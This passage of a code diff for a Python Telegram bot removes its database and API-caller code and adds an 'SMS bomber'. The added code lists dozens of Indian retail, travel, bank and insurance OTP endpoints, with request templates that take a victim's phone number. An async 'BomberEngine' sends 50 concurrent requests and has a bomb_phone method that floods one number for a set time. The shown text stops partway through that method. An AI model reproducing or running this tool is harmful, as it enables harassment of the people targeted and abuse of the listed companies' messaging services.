+        "method": "GET",
+        "headers": {"Referer": "https://www.bigcash.live/games/poker"},
+        "data": None
+    },
+    {
+        "name": "WorkIndia SMS",
+        "url": lambda p: f"https://api.workindia.in/api/candidate/profile/login/verify-number/?mobile_no={p}&version_number=623",
+        "method": "GET",
+        "headers": {},
+        "data": None
+    },
+    {
+        "name": "Aakash SMS",
+        "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobile_number":"{p}","activity_type":"aakash-myadmission"}}'
+    },
+    {
+        "name": "Revv SMS",
+        "url": "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobile":"{p}","deviceType":"website"}}'
+    },
+    {
+        "name": "DeHaat SMS",
+        "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobile":"{p}","client_id":"kisan-app"}}'
+    },
+    {
+        "name": "A23Games SMS",
+        "url": "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobile":"{p}","device_id":"android123","model":"Google,Android SDK built for x86,10"}}'
+    },
+    {
+        "name": "Spencers SMS",
+        "url": "https://jiffy.spencers.in/user/auth/otp/send",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobile":"{p}"}}'
+    },
+    {
+        "name": "PayMeIndia SMS",
+        "url": "https://api.paymeindia.in/api/v2/authentication/phone_no_verify/",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"phone":"{p}","app_signature":"S10ePIIrbH3"}}'
+    },
+    {
+        "name": "HyugaAuth SMS",
+        "url": "https://hyuga-auth-service.pratech.live/v1/auth/otp/generate",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobile":"{p}"}}'
+    },
+    {
+        "name": "Doubtnut SMS",
+        "url": "https://api.doubtnut.com/v4/student/login",
+        "method": "POST",
+        "headers": {"content-type": "application/json; charset=utf-8"},
+        "data": lambda p: f'{{"phone_number":"{p}","language":"en"}}'
+    },
+    {
+        "name": "PenPencil SMS",
+        "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
+        "method": "POST",
+        "headers": {"content-type": "application/json; charset=utf-8"},
+        "data": lambda p: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{p}"}}'
+    },
+    {
+        "name": "DaycoIndia SMS",
+        "url": "https://ekyc.daycoindia.com/api/nscript_functions.php",
+        "method": "POST",
+        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
+        "data": lambda p: f"api=send_otp&brand=dayco&mob={p}&resend_otp=resend_otp"
+    },
+    {
+        "name": "Entri SMS",
+        "url": "https://entri.app/api/v3/users/check-phone/",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"phone":"{p}"}}'
+    },
+    {
+        "name": "Grofers SMS",
+        "url": "https://grofers.com/v2/accounts/",
+        "method": "POST",
+        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+        "data": lambda p: f"user_phone={p}"
+    },
+    {
+        "name": "Snapdeal SMS",
+        "url": "https://m.snapdeal.com/signupCompleteAjax",
+        "method": "POST",
+        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
+        "data": lambda p: f"j_mobilenumber={p}&agree=true&journey=mobile"
+    },
+    {
+        "name": "Dream11 SMS",
+        "url": "https://www.dream11.com/graphql/mutation/pwa/register",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"query":"mutation register( $email: String! $mobileNumber: String! $password: String! $site: String) {{ registerSendOTPMutation( email: $email mobileNumber: $mobileNumber password: $password site: $site ) {{ message }} }}","variables":{{"email":"test@gmail.com","mobileNumber":"{p}","password":"Test@123"}}}}'
+    },
+    {
+        "name": "Byjus SMS",
+        "url": "https://bcas-prod.byjusweb.com/api/send-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+        "data": lambda p: f"phoneNumber={p}&page=free-trial-classes"
+    },
+    {
+        "name": "Unacademy SMS",
+        "url": "https://unacademy.com/api/v3/user/user_check/",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"phone":"{p}","country_code":"IN","otp_type":1,"send_otp":true}}'
+    },
+    {
+        "name": "Vedantu SMS",
+        "url": "https://user.vedantu.com/user/preLoginVerification",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"phoneCode":"+91","phoneNumber":"{p}","ver":"11.345"}}'
+    },
+    {
+        "name": "RedBus SMS",
+        "url": "https://m.redbus.in/api/getOtp?number={p}&cc=91&whatsAppOpted=undefined",
+        "method": "GET",
+        "headers": {},
+        "data": None
+    },
+    {
+        "name": "Oyo SMS",
+        "url": "https://www.oyorooms.com/api/pwa/generateotp?locale=en",
+        "method": "POST",
+        "headers": {"Content-Type": "text/plain;charset=UTF-8"},
+        "data": lambda p: f'{{"phone":"{p}","country_code":"+91","nod":4}}'
+    },
+    {
+        "name": "Makemytrip SMS",
+        "url": "https://mapi.makemytrip.com/ext/web/pwa/isUserRegistered?region=in&language=eng&currency=inr",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"loginId":"{p}","type":"MOBILE","version":2,"countryCode":"91"}}'
+    },
+    {
+        "name": "Goibibo SMS",
+        "url": "https://www.goibibo.com/common/downloadsms/",
+        "method": "POST",
+        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+        "data": lambda p: f"mbl={p}"
+    },
+    {
+        "name": "Ola SMS",
+        "url": "https://accounts.olacabs.com/api/login",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobileNumber":"{p}","dialingCode":"+91","countryCode":"IN","headers":{{}},"verificationId":null}}'
+    },
+    {
+        "name": "Uber SMS",
+        "url": "https://auth.uber.com/v2/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobile":"{p}"}}'
+    },
+    {
+        "name": "Amazon SMS",
+        "url": "https://www.amazon.in/ap/signin",
+        "method": "POST",
+        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+        "data": lambda p: f"email={p}&create=1"
+    },
+    {
+        "name": "Flipkart SMS",
+        "url": "https://www.flipkart.com/api/5/user/otp/generate",
+        "method": "POST",
+        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+        "data": lambda p: f"loginId=+91{p}"
+    },
+    {
+        "name": "Myntra SMS",
+        "url": "https://www.myntra.com/gw/mobile-auth/otp/generate",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobile":"{p}"}}'
+    },
+    {
+        "name": "Paytm SMS",
+        "url": "https://accounts.paytm.com/signin/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"phone":"{p}","loginData":"LOGIN_USING_PHONE"}}'
+    },
+    {
+        "name": "PhonePe SMS",
+        "url": "https://www.phonepe.com/api/v2/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"phone":"{p}"}}'
+    },
+    {
+        "name": "Zomato SMS",
+        "url": "https://www.zomato.com/webroutes/auth/login",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"country_id":1,"phone":"{p}","verification_type":"sms","method":"phone"}}'
+    },
+    {
+        "name": "Swiggy SMS",
+        "url": "https://www.swiggy.com/mapi/auth/signup",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"name":"Test","email":"test@gmail.com","password":"Test@123","referral_code":"","mobile":"{p}","_csrf":"test"}}'
+    },
+    {
+        "name": "BigBasket SMS",
+        "url": "https://www.bigbasket.com/mapi/v4.0.0/member-svc/otp/send/",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"identifier":"{p}"}}'
+    },
+    {
+        "name": "BookMyShow SMS",
+        "url": "https://in.bookmyshow.com/pwa/api/uapi/otp/send",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"channel":"phone","subChannel":"sms","details":{{"phone":"{p}","origin":"https://in.bookmyshow.com"}}}}'
+    },
+    {
+        "name": "Ajio SMS",
+        "url": "https://login.web.ajio.com/api/auth/signupSendOTP",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"firstName":"Test","login":"test@gmail.com","password":"Test@123","genderType":"Male","mobileNumber":"{p}","requestType":"SENDOTP"}}'
+    },
+    {
+        "name": "Nykaa SMS",
+        "url": "https://www.nykaa.com/api/auth/send-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobile":"{p}"}}'
+    },
+    {
+        "name": "Practo SMS",
+        "url": "https://accounts.practo.com/send_otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+        "data": lambda p: f"client_name=Practo%20Android%20App&mobile=+91{p}&fingerprint=&device_name=test"
+    },
+    {
+        "name": "1mg SMS",
+        "url": "https://www.1mg.com/auth_api/v6/create_token",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json; charset=utf-8"},
+        "data": lambda p: f'{{"number":"{p}","is_corporate_user":false,"otp_on_call":false}}'
+    },
+    {
+        "name": "Netmeds SMS V2",
+        "url": "https://www.netmeds.com/mst/rest/v1/id/details/{p}",
+        "method": "GET",
+        "headers": {},
+        "data": None
+    },
+    {
+        "name": "PharmEasy SMS V2",
+        "url": "https://pharmeasy.in/api/auth/requestOTP",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"contactNumber":"{p}"}}'
+    },
+    {
+        "name": "Croma SMS",
+        "url": "https://api.croma.com/otp/generate",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"phone":"{p}"}}'
+    },
+    {
+        "name": "Reliance Digital SMS",
+        "url": "https://www.reliancedigital.in/api/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobile":"{p}"}}'
+    },
+    {
+        "name": "FirstCry SMS",
+        "url": "https://www.firstcry.com/api/sendotp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobile":"{p}"}}'
+    },
+    {
+        "name": "Zepto SMS",
+        "url": "https://api.zepto.com/v2/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobile":"{p}"}}'
+    },
+    {
+        "name": "Blinkit SMS",
+        "url": "https://blinkit.com/api/otp/generate",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"phone":"{p}"}}'
+    },
+    {
+        "name": "Mobikwik SMS",
+        "url": "https://www.mobikwik.com/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobile":"{p}"}}'
+    },
+    {
+        "name": "Freecharge SMS",
+        "url": "https://www.freecharge.in/api/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"phone":"{p}"}}'
+    },
+    {
+        "name": "Airtel Thanks SMS",
+        "url": "https://www.airtel.in/thanks-app/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobile":"{p}"}}'
+    },
+    {
+        "name": "Jio SMS",
+        "url": "https://www.jio.com/api/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"phone":"{p}"}}'
+    },
+    {
+        "name": "Vi SMS",
+        "url": "https://www.myvi.in/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobile":"{p}"}}'
+    },
+    {
+        "name": "PolicyBazaar SMS",
+        "url": "https://www.policybazaar.com/api/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobile":"{p}"}}'
+    },
+    {
+        "name": "CoverFox SMS",
+        "url": "https://www.coverfox.com/api/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"phone":"{p}"}}'
+    },
+    {
+        "name": "Acko SMS",
+        "url": "https://www.acko.com/api/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobile":"{p}"}}'
+    },
+    {
+        "name": "Digit Insurance SMS",
+        "url": "https://www.godigit.com/api/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"phone":"{p}"}}'
+    },
+    {
+        "name": "HDFC Ergo SMS",
+        "url": "https://www.hdfcergo.com/api/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobile":"{p}"}}'
+    },
+    {
+        "name": "ICICI Lombard SMS",
+        "url": "https://www.icicilombard.com/api/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"phone":"{p}"}}'
+    },
+    {
+        "name": "Bajaj Allianz SMS",
+        "url": "https://www.bajajallianz.com/api/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobile":"{p}"}}'
+    },
+    {
+        "name": "Star Health SMS",
+        "url": "https://www.starhealth.in/api/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"phone":"{p}"}}'
+    },
+    {
+        "name": "Max Bupa SMS",
+        "url": "https://www.maxbupa.com/api/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobile":"{p}"}}'
+    },
+    {
+        "name": "Kotak Life SMS",
+        "url": "https://www.kotaklife.com/api/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"phone":"{p}"}}'
+    },
+    {
+        "name": "SBI Life SMS",
+        "url": "https://www.sbilife.co.in/api/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobile":"{p}"}}'
+    },
+    {
+        "name": "LIC SMS",
+        "url": "https://www.licindia.in/api/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"phone":"{p}"}}'
+    },
+    {
+        "name": "HDFC Life SMS",
+        "url": "https://www.hdfclife.com/api/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobile":"{p}"}}'
+    },
+    {
+        "name": "Axis Bank SMS",
+        "url": "https://www.axisbank.com/api/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"phone":"{p}"}}'
+    },
+    {
+        "name": "ICICI Bank SMS",
+        "url": "https://www.icicibank.com/api/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobile":"{p}"}}'
+    },
+    {
+        "name": "HDFC Bank SMS",
+        "url": "https://www.hdfcbank.com/api/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"phone":"{p}"}}'
+    },
+    {
+        "name": "SBI Bank SMS",
+        "url": "https://www.sbi.co.in/api/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobile":"{p}"}}'
+    },
+    {
+        "name": "Kotak Bank SMS",
+        "url": "https://www.kotak.com/api/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"phone":"{p}"}}'
+    },
+    {
+        "name": "Yes Bank SMS",
+        "url": "https://www.yesbank.in/api/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobile":"{p}"}}'
+    },
+    {
+        "name": "IndusInd Bank SMS",
+        "url": "https://www.indusind.com/api/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"phone":"{p}"}}'
+    },
+    {
+        "name": "IDFC Bank SMS",
+        "url": "https://www.idfcfirstbank.com/api/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobile":"{p}"}}'
+    },
+    {
+        "name": "AU Bank SMS",
+        "url": "https://www.aubank.in/api/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"phone":"{p}"}}'
+    },
+    {
+        "name": "RBL Bank SMS",
+        "url": "https://www.rblbank.com/api/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobile":"{p}"}}'
+    },
+    {
+        "name": "Bandhan Bank SMS",
+        "url": "https://www.bandhanbank.com/api/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"phone":"{p}"}}'
+    },
+    {
+        "name": "Federal Bank SMS",
+        "url": "https://www.federalbank.co.in/api/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobile":"{p}"}}'
+    },
+    {
+        "name": "Canara Bank SMS",
+        "url": "https://www.canarabank.com/api/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"phone":"{p}"}}'
+    },
+    {
+        "name": "PNB SMS",
+        "url": "https://www.pnbindia.in/api/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobile":"{p}"}}'
+    },
+    {
+        "name": "Bank of Baroda SMS",
+        "url": "https://www.bankofbaroda.in/api/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"phone":"{p}"}}'
+    },
+    {
+        "name": "Union Bank SMS",
+        "url": "https://www.unionbankofindia.co.in/api/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"mobile":"{p}"}}'
+    },
+    {
+        "name": "IDBI Bank SMS",
+        "url": "https://www.idbibank.com/api/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda p: f'{{"phone":"{p}"}}'
+    },
+]
 
-# -----------------------------------------------------------------------
-# Database
-# -----------------------------------------------------------------------
-# DB path — tries /data first (Railway Volume), falls back to local bot.db
-_data_dir = "/data"
-try:
-    os.makedirs(_data_dir, exist_ok=True)
-    # Test if writable
-    _test = os.path.join(_data_dir, ".write_test")
-    open(_test, "w").close(); os.remove(_test)
-    DB_PATH = os.path.join(_data_dir, "bot.db")
-except Exception:
-    DB_PATH = "bot.db"
-    log.warning("Could not use /data, falling back to local bot.db")
+# Combine all APIs
+for api in CALL_APIS + WHATSAPP_APIS + SMS_APIS:
+    ULTIMATE_OTP_APIS.append(api)
 
-def db_init():
-    conn = sqlite3.connect(DB_PATH)
-    conn.execute("""CREATE TABLE IF NOT EXISTS users (
-        user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT,
-        credits INTEGER DEFAULT 0, verified INTEGER DEFAULT 0,
-        referred_by INTEGER, referral_credited INTEGER DEFAULT 0,
-        premium INTEGER DEFAULT 0)""")
-    conn.execute("""CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT)""")
-    conn.execute("""CREATE TABLE IF NOT EXISTS admins (user_id INTEGER PRIMARY KEY, added_by INTEGER)""")
-    conn.execute("""CREATE TABLE IF NOT EXISTS force_channels (chat_id TEXT PRIMARY KEY, name TEXT, url TEXT)""")
-    conn.execute("""CREATE TABLE IF NOT EXISTS api_stats (
-        id INTEGER PRIMARY KEY AUTOINCREMENT,
-        user_id INTEGER, code TEXT,
-        api_name TEXT, timestamp TEXT,
-        success INTEGER DEFAULT 1)""")
-    conn.execute("""CREATE TABLE IF NOT EXISTS gift_codes (
-        code TEXT PRIMARY KEY,
-        credits INTEGER DEFAULT 0,
-        max_uses INTEGER DEFAULT 1,
-        used_count INTEGER DEFAULT 0,
-        created_by INTEGER,
-        created_at TEXT,
-        active INTEGER DEFAULT 1)""")
-    conn.execute("""CREATE TABLE IF NOT EXISTS gift_claims (
-        id INTEGER PRIMARY KEY AUTOINCREMENT,
-        code TEXT, user_id INTEGER,
-        claimed_at TEXT)""")
-    cols = [r[1] for r in conn.execute("PRAGMA table_info(users)").fetchall()]
-    if "premium" not in cols:
-        conn.execute("ALTER TABLE users ADD COLUMN premium INTEGER DEFAULT 0")
-    if FORCE_CHANNELS:
-        for ch in FORCE_CHANNELS:
-            conn.execute("INSERT OR IGNORE INTO force_channels(chat_id,name,url) VALUES(?,?,?)",
-                        (str(ch["chat_id"]), ch["name"], ch["url"]))
-    conn.commit()
-    conn.close()
+# ==================================================================
+# 🚀 ASYNC BOMBER ENGINE
+# ==================================================================
+class BomberEngine:
+    def __init__(self):
+        self.timeout = aiohttp.ClientTimeout(total=10)
+        self.semaphore = asyncio.Semaphore(50)  # 50 concurrent requests
+        self.success_count = 0
+        self.fail_count = 0
+        self.total_apis = len(ULTIMATE_OTP_APIS)
+        self.lock = threading.Lock()
+        
+    def process_api(self, api: dict, phone: str) -> dict:
+        """Process a single API configuration and return the request details"""
+        url = api.get("url")
+        if callable(url):
+            url = url(phone)
+            
+        data = api.get("data")
+        if callable(data):
+            data = data(phone)
+        elif data is None:
+            data = {}
+        elif isinstance(data, str):
+            pass  # keep as string
+            
+        headers = api.get("headers", {}).copy()
+        if isinstance(headers, dict):
+            # Replace any callable headers
+            for k, v in headers.items():
+                if callable(v):
+                    if k.lower() == "content-length":
+                        headers[k] = str(len(str(data))) if data else "0"
+                    else:
+                        headers[k] = v(data) if callable(v) else v
+        
+        return {
+            "name": api.get("name", "Unknown"),
+            "url": url,
+            "method": api.get("method", "POST"),
+            "headers": headers,
+            "data": data,
+            "phone_format": api.get("phone_format", "raw")
+        }
 
-def _q(sql, p=()):
-    c = sqlite3.connect(DB_PATH); r = c.execute(sql,p).fetchone(); c.close(); return r
-def _qa(sql, p=()):
-    c = sqlite3.connect(DB_PATH); r = c.execute(sql,p).fetchall(); c.close(); return r
-def _ex(sql, p=()):
-    c = sqlite3.connect(DB_PATH); cur = c.execute(sql,p); c.commit(); n = cur.rowcount; c.close(); return n
-
-def db_get_user(uid): return _q("SELECT user_id,username,first_name,credits,verified,referred_by,referral_credited,premium FROM users WHERE user_id=?",(uid,))
-def db_create_user(uid,uname,fname,ref=None): _ex("INSERT OR IGNORE INTO users(user_id,username,first_name,credits,verified,referred_by) VALUES(?,?,?,0,0,?)",(uid,uname,fname,ref))
-def db_set_verified(uid): _ex("UPDATE users SET verified=1 WHERE user_id=?",(uid,))
-def db_add_credits(uid,n): _ex("UPDATE users SET credits=credits+? WHERE user_id=?",(n,uid))
-def db_set_credits(uid,n): return _ex("UPDATE users SET credits=? WHERE user_id=?",(n,uid))>0
-def db_set_premium(uid,v): return _ex("UPDATE users SET premium=? WHERE user_id=?",(v,uid))>0
-def db_mark_ref(uid): _ex("UPDATE users SET referral_credited=1 WHERE user_id=?",(uid,))
-def db_count_refs(uid): return (_q("SELECT COUNT(*) FROM users WHERE referred_by=? AND referral_credited=1",(uid,)) or (0,))[0]
-
-def db_get_setting(k,d=None):
-    r = _q("SELECT value FROM settings WHERE key=?",(k,)); return r[0] if r else d
-def db_set_setting(k,v): _ex("INSERT INTO settings(key,value) VALUES(?,?) ON CONFLICT(key) DO UPDATE SET value=excluded.value",(k,v))
-def is_bot_enabled(): return db_get_setting("bot_enabled","1")=="1"
-def get_video(): return db_get_setting("profile_video", PROFILE_VIDEO)
-
-def db_is_admin(uid): return uid==OWNER_ID or bool(_q("SELECT 1 FROM admins WHERE user_id=?",(uid,)))
-def db_add_admin(uid,by): _ex("INSERT OR IGNORE INTO admins(user_id,added_by) VALUES(?,?)",(uid,by))
-def db_remove_admin(uid): return _ex("DELETE FROM admins WHERE user_id=?",(uid,))>0
-def db_list_admins(): return [r[0] for r in _qa("SELECT user_id FROM admins")]
-
-def db_add_channel(cid,name,url): _ex("INSERT INTO force_channels(chat_id,name,url) VALUES(?,?,?) ON CONFLICT(chat_id) DO UPDATE SET name=excluded.name,url=excluded.url",(str(cid),name,url))
-def db_remove_channel(cid): return _ex("DELETE FROM force_channels WHERE chat_id=?",(str(cid),))>0
-def db_list_channels(): return [{"chat_id":r[0],"name":r[1],"url":r[2]} for r in _qa("SELECT chat_id,name,url FROM force_channels")]
-
-def db_log_api(uid, code, api_name, success=1):
-    _ex("INSERT INTO api_stats(user_id,code,api_name,timestamp,success) VALUES(?,?,?,?,?)",
-        (uid, code, api_name, datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S"), success))
-
-def db_get_stats():
-    total_uses   = (_q("SELECT COUNT(*) FROM api_stats") or (0,))[0]
-    unique_codes = (_q("SELECT COUNT(DISTINCT code) FROM api_stats") or (0,))[0]
-    unique_users = (_q("SELECT COUNT(DISTINCT user_id) FROM api_stats") or (0,))[0]
-    first_use    = _q("SELECT timestamp FROM api_stats ORDER BY id ASC LIMIT 1")
-    last_use     = _q("SELECT timestamp FROM api_stats ORDER BY id DESC LIMIT 1")
-    total_users  = (_q("SELECT COUNT(*) FROM users") or (0,))[0]
-    verified     = (_q("SELECT COUNT(*) FROM users WHERE verified=1") or (0,))[0]
-    return {
-        "total_uses": total_uses, "unique_codes": unique_codes,
-        "unique_users": unique_users, "total_users": total_users,
-        "verified": verified,
-        "first_use": first_use[0] if first_use else "N/A",
-        "last_use":  last_use[0]  if last_use  else "N/A",
-    }
-
-def db_get_all_user_ids():
-    """Returns all verified user IDs for broadcast."""
-    return [r[0] for r in _qa("SELECT user_id FROM users WHERE verified=1")]
-
-# Gift code helpers
-def db_create_gift(code, credits, max_uses, created_by):
-    _ex("INSERT OR REPLACE INTO gift_codes(code,credits,max_uses,used_count,created_by,created_at,active) VALUES(?,?,?,0,?,?,1)",
-        (code.upper(), credits, max_uses, created_by, datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")))
-
-def db_get_gift(code):
-    return _q("SELECT code,credits,max_uses,used_count,created_by,created_at,active FROM gift_codes WHERE code=?",
-               (code.upper(),))
-
-def db_has_claimed(code, user_id):
-    return bool(_q("SELECT 1 FROM gift_claims WHERE code=? AND user_id=?",(code.upper(), user_id)))
-
-def db_claim_gift(code, user_id):
-    _ex("UPDATE gift_codes SET used_count=used_count+1 WHERE code=?",(code.upper(),))
-    _ex("INSERT INTO gift_claims(code,user_id,claimed_at) VALUES(?,?,?)",
-        (code.upper(), user_id, datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")))
-
-def db_deactivate_gift(code):
-    return _ex("UPDATE gift_codes SET active=0 WHERE code=?",(code.upper(),)) > 0
-
-def db_list_gifts():
-    return _qa("SELECT code,credits,max_uses,used_count,active FROM gift_codes ORDER BY rowid DESC LIMIT 20")
-
-
-# -----------------------------------------------------------------------
-# API caller
-# -----------------------------------------------------------------------
-async def call_api(cfg: dict, code: str) -> dict:
-    method = cfg.get("method","GET").upper()
-    style  = cfg.get("param_style","query")
-    pname  = cfg.get("param_name","phone")
-    hdrs   = cfg.get("headers") or {}
-    url    = cfg["url"]
-
-    async with httpx.AsyncClient(timeout=60) as client:
-        if style == "path":
-            url = f"{url.rstrip('/')}/{code}"; params = None
-        elif style == "query":
-            params = {pname: code}
-        else:
-            params = None
-
-        try:
-            if method == "GET":
-                resp = await client.get(url, params=params, headers=hdrs)
-            else:
-                if style == "json":
-                    resp = await client.post(url, json={pname:code}, headers=hdrs)
+    async def make_request(self, session: aiohttp.ClientSession, api: dict, phone: str):
+        """Make a single API request"""
+        async with self.semaphore:
+            try:
+                req = self.process_api(api, phone)
+                method = req.get("method", "POST").upper()
+                url = req.get("url")
+                headers = req.get("headers", {})
+                data = req.get("data", {})
+                
+                if not url:
+                    return False, "No URL"
+                
+                # Prepare request
+                kwargs = {
+                    "headers": headers,
+                    "timeout": self.timeout,
+                }
+                
+                if method == "GET":
+                    kwargs["params"] = data if isinstance(data, dict) else {}
                 else:
-                    resp = await client.post(url, params=params, headers=hdrs)
+                    if isinstance(data, dict):
+                        kwargs["json"] = data
+                    else:
+                        kwargs["data"] = data
+                
+                # Make request
+                async with session.request(method, url, **kwargs) as response:
+                    status = response.status
+                    success = 200 <= status < 300
+                    
+                    if success:
+                        with self.lock:
+                            self.success_count += 1
+                    
+                    return success, status
+                    
+            except Exception as e:
+                with self.lock:
+                    self.fail_count += 1
+                return False, str(e)
 
-            log.info("API %s %s → %s", method, resp.url, resp.status_code)
-            try:
-                data = resp.json(); data["_status_code"] = resp.status_code; return data
-            except Exception:
-                return {"data": resp.text, "_status_code": resp.status_code}
-        except httpx.ConnectError as e:
-            return {"error": f"Connection failed: {e}"}
-        except httpx.TimeoutException:
-            return {"error": "Request timed out"}
-        except Exception as e:
-            return {"error": str(e)}
+    async def bomb_phone(self, phone: str, duration: int = 30) -> dict:
+        """Bomb a phone number with all APIs for specified duration"""
+        self.success_count = 0
+        self.fail_count = 0
+        
+        start_time = time.time()
+        end_time = start_time + duration
+        
+        async with aiohttp.ClientSession() as session:
+            tasks = []
+            
+            # Create initial batch
+            for api in ULTIMATE_OTP_APIS:
+                tasks.append(self.make_request(session, api, phone))
+            
+            # Run initial batch
+            results = await asyncio.gather(*tasks, return_exceptions=True)
+            
